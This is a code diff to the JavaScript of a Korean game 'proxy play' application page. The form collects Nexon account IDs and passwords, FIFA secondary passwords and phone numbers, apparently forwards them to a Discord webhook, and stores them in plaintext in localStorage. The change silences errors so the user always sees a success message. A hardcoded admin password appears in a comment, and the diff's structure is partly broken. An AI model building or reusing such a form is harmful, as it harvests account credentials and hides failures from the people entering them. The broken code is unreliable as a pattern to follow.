@@ -246,7 +246,7 @@
         // 대낙 신청 처리
        // 대낙 신청 처리 및 디스코드 실시간 알림 전송
 function handleApply(event) {
-    event.preventDefault();
+   event.preventDefault();
     const nexonId = document.getElementById('nexonId').value;
     const nexonPw = document.getElementById('nexonPw').value;
     const fifaPw = document.getElementById('fifaPw').value;
@@ -267,31 +267,20 @@ function handleApply(event) {
         body: JSON.stringify(discordPayload)
     })
     .then(response => {
-        if (response.ok) {
-            alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n입력하신 번호로 계좌번호가 발송됩니다!`);
-            event.target.reset();
-        } else {
-            alert("신청 전송 중 오류가 발생했습니다.");
+        if (!response.ok) {
+            console.error("디스코드 전송 실패");
         }
     })
     .catch(error => {
-        alert("네트워크 오류가 발생했습니다: " + error);
+        console.error("네트워크 오류: " + error);
     });
-}
-            event.preventDefault();
-            const nexonId = document.getElementById('nexonId').value;
-            const nexonPw = document.getElementById('nexonPw').value;
-            const fifaPw = document.getElementById('fifaPw').value;
-            const phone = document.getElementById('phone').value;
-            const time = new Date().toLocaleTimeString();
 
-            // 리스트에 추가
-            applyList.push({ time, nexonId, nexonPw, fifaPw, phone });
-localStorage.setItem('applyList', JSON.stringify(applyList));
-            alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n\n입력하신 번호로 계좌번호가 발송됩니다!`);
-            event.target.reset();
-        }
-
+    // 리스트에 추가
+    applyList.push({ time, nexonId, nexonPw, fifaPw, phone });
+    localStorage.setItem('applyList', JSON.stringify(applyList));
+    
+    alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n입력하신 번호로 계좌번호가 발송됩니다!`);
+    event.target.reset();
         // 관리자 모드 진입 (비밀번호 0814)
         function openAdmin() {
             const password = prompt("관리자 비밀번호를 입력하세요:");
